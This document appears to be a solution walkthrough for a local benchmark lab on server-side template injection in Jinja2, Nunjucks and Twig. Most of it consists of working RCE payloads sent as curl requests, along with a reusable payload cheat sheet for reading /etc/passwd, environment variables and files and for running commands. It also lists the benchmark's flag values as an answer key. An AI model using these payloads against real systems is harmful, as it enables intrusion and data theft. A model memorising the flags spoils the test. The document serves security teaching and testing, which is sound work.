# S7BEN-VHARD-009: Server-Side Template Injection Testing Guide

## Overview

This guide provides step-by-step instructions for exploiting Server-Side Template Injection (SSTI) vulnerabilities across three different template engines: Python/Jinja2, Node.js/Nunjucks, and PHP/Twig. You'll learn to identify, fingerprint, and exploit SSTI to achieve Remote Code Execution (RCE) and extract flags.

## Prerequisites

- Docker and Docker Compose installed
- curl or similar HTTP client
- Basic understanding of template engines
- Estimated time: 60-90 minutes

## Setup

```bash
cd benchmarks/S7BEN-VHARD-009
docker compose up -d
```

Wait for all services to become healthy:
```bash
docker compose ps
```

Expected output:
```
NAME            IMAGE             STATUS         PORTS
ssti-jinja2     ssti-jinja2-app   healthy        0.0.0.0:5000->5000/tcp
ssti-nunjucks   ssti-nunjucks-app healthy        0.0.0.0:3000->3000/tcp
ssti-twig       ssti-twig-app     healthy        0.0.0.0:8080->80/tcp
```

## Architecture

- **jinja2-app** (port 5000): Python/Flask application with Jinja2 SSTI
- **nunjucks-app** (port 3000): Node.js/Express application with Nunjucks SSTI
- **twig-app** (port 8080): PHP application with Twig SSTI

---

## Phase 1: Template Injection Discovery

### Objective
Identify SSTI vulnerabilities by testing template syntax across all three applications.

### Step 1.1: Test for Basic SSTI

Test each application with mathematical expressions to detect SSTI:

**Jinja2 (Port 5000):**
```bash
curl "http://localhost:5000/greet?name={{7*7}}"
```

**Nunjucks (Port 3000):**
```bash
curl "http://localhost:3000/greet?name={{7*7}}"
```

**Twig (Port 8080):**
```bash
curl "http://localhost:8080/greet.php?name={{7*7}}"
```

**Expected Result:**
If SSTI is present, you should see `49` in the response instead of `{{7*7}}`.

### Step 1.2: Template Engine Fingerprinting

Use error messages and specific syntax to identify the template engine:

**Test Jinja2-specific syntax:**
```bash
curl "http://localhost:5000/test?template={{config}}"
```

**Test Nunjucks-specific syntax:**
```bash
curl "http://localhost:3000/test?template={{range(1,10)}}"
```

**Test Twig-specific syntax:**
```bash
curl "http://localhost:8080/test.php?template={{_self}}"
```

### Step 1.3: Confirm Template Injection

Test with string concatenation:

**All engines:**
```bash
# Jinja2
curl "http://localhost:5000/test?template={{'hello'+'world'}}"

# Nunjucks
curl "http://localhost:3000/test?template={{'hello'+'world'}}"

# Twig
curl "http://localhost:8080/test.php?template={{'hello'~'world'}}"
```

**Expected Result:**
Should output `helloworld` confirming template rendering.

---

## Phase 2: Jinja2 Template Injection (Python/Flask)

### Objective
Exploit Jinja2 SSTI to achieve Python code execution and read the flag file.

### Step 2.1: Access Built-in Objects

Jinja2 provides access to Python built-in objects through template context:

```bash
curl "http://localhost:5000/test?template={{config}}"
```

This reveals Flask configuration including SECRET_KEY.

### Step 2.2: Use MRO to Access Object Classes

Method Resolution Order (MRO) allows accessing all Python classes:

```bash
curl "http://localhost:5000/test?template={{''.__class__.__mro__}}"
```

**Expected Output:**
```
(<class 'str'>, <class 'object'>)
```

### Step 2.3: Access Subclasses

Get all subclasses of the object class:

```bash
curl "http://localhost:5000/test?template={{''.__class__.__mro__[1].__subclasses__()}}"
```

This returns a list of all Python classes available.

### Step 2.4: Find Useful Classes

Look for classes that can read files. Common useful classes:
- `<class '_frozen_importlib_external.FileLoader'>` (index varies)
- `<class 'subprocess.Popen'>`
- `<class 'os._wrap_close'>`

Find the index of a useful class:
```bash
curl "http://localhost:5000/test?template={{''.__class__.__mro__[1].__subclasses__()[104]}}"
```

Note: The index number (104) may vary. You need to find the right index for `subprocess.Popen` or similar.

### Step 2.5: Execute Python Code

Use the Popen class to execute commands:

```bash
curl "http://localhost:5000/test?template={{''.__class__.__mro__[1].__subclasses__()[104]('cat /app/flag.txt',shell=True,stdout=-1).communicate()[0].decode()}}"
```

**Alternative payload using config:**
```bash
curl "http://localhost:5000/test?template={{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}"
```

**Simplified payload (if `request` is available):**
```bash
curl "http://localhost:5000/test?template={{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read()}}"
```

**🚩 Flag 1 Retrieved:** `S7BEN{jinja2_ssti_python_rce_a1b2c3d4}`

### Step 2.6: Alternative RCE Methods

**Using `__import__`:**
```bash
curl "http://localhost:5000/test?template={{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /app/flag.txt').read()}}"
```

**Using lipsum:**
```bash
curl "http://localhost:5000/test?template={{lipsum.__globals__['os'].popen('cat /app/flag.txt').read()}}"
```

---

## Phase 3: Nunjucks Template Injection (Node.js/Express)

### Objective
Exploit Nunjucks SSTI to achieve JavaScript code execution and read the flag file.

### Step 3.1: Access Range Filter

Nunjucks `range` filter can be used to access the constructor:

```bash
curl "http://localhost:3000/test?template={{range(0,1)}}"
```

### Step 3.2: Access Global Objects

Use range to get the constructor:

```bash
curl "http://localhost:3000/test?template={{range.constructor}}"
```

**Expected Output:**
```
function Function() { [native code] }
```

### Step 3.3: Execute JavaScript Code

Use the Function constructor to execute arbitrary JavaScript:

```bash
curl "http://localhost:3000/test?template={{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"cat /app/flag.txt\").toString()')()}}"
```

**Simpler payload:**
```bash
curl -G "http://localhost:3000/test" --data-urlencode "template={{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"cat /app/flag.txt\")')()}}"
```

**🚩 Flag 2 Retrieved:** `S7BEN{nunjucks_ssti_nodejs_rce_e5f6g7h8}`

### Step 3.4: Alternative Payloads

**Using require directly:**
```bash
curl -G "http://localhost:3000/test" --data-urlencode "template={{range.constructor('return global.process.mainModule.constructor._load(\"child_process\").execSync(\"cat /app/flag.txt\").toString()')()}}"
```

**Read environment variables:**
```bash
curl -G "http://localhost:3000/test" --data-urlencode "template={{range.constructor('return process.env')()}}"
```

**List directory:**
```bash
curl -G "http://localhost:3000/test" --data-urlencode "template={{range.constructor('return require(\"fs\").readdirSync(\"/app\")')()}}"
```

---

## Phase 4: Twig Template Injection (PHP)

### Objective
Exploit Twig SSTI to achieve PHP code execution and read the flag file.

### Step 4.1: Access Twig Environment

Twig provides `_self` to access the current template:

```bash
curl "http://localhost:8080/test.php?template={{_self}}"
```

### Step 4.2: Access Twig Environment Object

```bash
curl "http://localhost:8080/test.php?template={{_self.env}}"
```

**Expected Output:**
Shows Twig environment object.

### Step 4.3: Use getFilter to Access Functions

Twig's `getFilter` method can access registered filters:

```bash
curl "http://localhost:8080/test.php?template={{_self.env.getFilter('map')}}"
```

### Step 4.4: Execute PHP Functions via Filter

The `map` filter can be exploited to execute PHP functions:

```bash
curl -G "http://localhost:8080/test.php" --data-urlencode "template={{['cat /var/www/html/flag.txt']|map('system')}}"
```

**Alternative using passthru:**
```bash
curl -G "http://localhost:8080/test.php" --data-urlencode "template={{['cat /var/www/html/flag.txt']|map('passthru')}}"
```

**🚩 Flag 3 Retrieved:** `S7BEN{twig_ssti_php_rce_i9j0k1l2}`

### Step 4.5: Alternative RCE Methods

**Using `_self.env.registerUndefinedFilterCallback`:**
```bash
curl -G "http://localhost:8080/test.php" --data-urlencode "template={{_self.env.registerUndefinedFilterCallback('system')}}{{['cat /var/www/html/flag.txt']|test}}"
```

**Using `filter` with exec:**
```bash
curl -G "http://localhost:8080/test.php" --data-urlencode "template={{['cat /var/www/html/flag.txt']|filter('exec')}}"
```

**Read using file_get_contents:**
```bash
curl -G "http://localhost:8080/test.php" --data-urlencode "template={{['file_get_contents','/var/www/html/flag.txt']|reduce((carry,item)=>item(carry))}}"
```

---

## Phase 5: Cross-Engine Polyglot Payloads

### Objective
Develop SSTI payloads that work across multiple template engines.

### Step 5.1: Universal Detection Payload

Test this payload across all three engines:

```
{{7*7}}
```

This works in Jinja2, Nunjucks, and Twig, returning `49`.

### Step 5.2: String Concatenation Differences

Note the differences in string concatenation:

- **Jinja2/Nunjucks**: `{{'hello'+'world'}}`
- **Twig**: `{{'hello'~'world'}}`

### Step 5.3: Comments Syntax

Different comment syntax:

- **Jinja2**: `{# comment #}`
- **Nunjucks**: `{# comment #}`
- **Twig**: `{# comment #}`

All use the same comment syntax!

### Step 5.4: Extract All Flags with curl

```bash
# Jinja2 flag
curl -s "http://localhost:5000/test?template={{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}"

# Nunjucks flag
curl -s -G "http://localhost:3000/test" --data-urlencode "template={{range.constructor('return require(\"fs\").readFileSync(\"/app/flag.txt\",\"utf8\")')()}}"

# Twig flag
curl -s -G "http://localhost:8080/test.php" --data-urlencode "template={{['cat /var/www/html/flag.txt']|map('system')}}"
```

---

## Flag Summary

By completing all phases, you should have retrieved the following flags:

| Flag ID | Value | Engine | Location |
|---------|-------|--------|----------|
| FLAG_JINJA2 | `S7BEN{jinja2_ssti_python_rce_a1b2c3d4}` | Jinja2 | /app/flag.txt |
| FLAG_NUNJUCKS | `S7BEN{nunjucks_ssti_nodejs_rce_e5f6g7h8}` | Nunjucks | /app/flag.txt |
| FLAG_TWIG | `S7BEN{twig_ssti_php_rce_i9j0k1l2}` | Twig | /var/www/html/flag.txt |

---

## Verification

### Health Checks

Verify all services are healthy:
```bash
docker compose ps
curl http://localhost:5000/health
curl http://localhost:3000/health
curl http://localhost:8080/health.php
```

### Quick Flag Extraction

Extract all flags at once:
```bash
# Jinja2
docker exec ssti-jinja2 cat /app/flag.txt

# Nunjucks
docker exec ssti-nunjucks cat /app/flag.txt

# Twig
docker exec ssti-twig cat /var/www/html/flag.txt
```

---

## Cleanup

Stop and remove all containers:
```bash
docker compose down
```

Remove volumes (WARNING: destroys all data):
```bash
docker compose down -v
```

---

## Key Learning Points

1. **SSTI Detection**: Mathematical expressions like `{{7*7}}` help identify SSTI vulnerabilities.

2. **Template Engine Fingerprinting**: Error messages and specific syntax reveal the engine being used.

3. **Jinja2 Exploitation**: Use MRO (Method Resolution Order) to access Python built-in classes and functions.

4. **Nunjucks Exploitation**: Use `range.constructor` to access the Function constructor for JavaScript execution.

5. **Twig Exploitation**: Use filter functions like `map` to execute PHP functions.

6. **Defense**: Always use template engine auto-escaping, never render user input directly in templates, use sandboxed template environments.

---

## Common Payloads Reference

### Jinja2 (Python)

```python
# Read files
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}

# List directory
{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['os'].listdir('/')}}

# Execute commands
{{config.__class__.__init__.__globals__['os'].system('whoami')}}
```

### Nunjucks (Node.js)

```javascript
# Read files
{{range.constructor('return require("fs").readFileSync("/etc/passwd","utf8")')()}}

# Execute commands
{{range.constructor('return require("child_process").execSync("id").toString()')()}}

# Access process
{{range.constructor('return process.env')()}}
```

### Twig (PHP)

```php
# Execute commands
{{['id']|map('system')}}
{{['whoami']|map('passthru')}}

# Read files
{{['file_get_contents','/etc/passwd']|reduce((a,b)=>b(a))}}

# Using exec
{{['ls -la']|filter('exec')}}
```

---

## Common Pitfalls

- **URL Encoding**: Complex payloads with special characters need URL encoding. Use `curl -G --data-urlencode` for automatic encoding.
- **Index Numbers**: In Jinja2 payloads, class index numbers may vary. You may need to enumerate `__subclasses__()` to find the right index.
- **Escaping**: Some template engines auto-escape by default. This benchmark intentionally disables it.
- **Syntax Differences**: Pay attention to concatenation operators: `+` vs `~`

---

## References

- [PortSwigger: Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
- [HackTricks: SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [OWASP: Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)

---

**Benchmark Complete!** You have successfully exploited SSTI vulnerabilities in all three template engines.
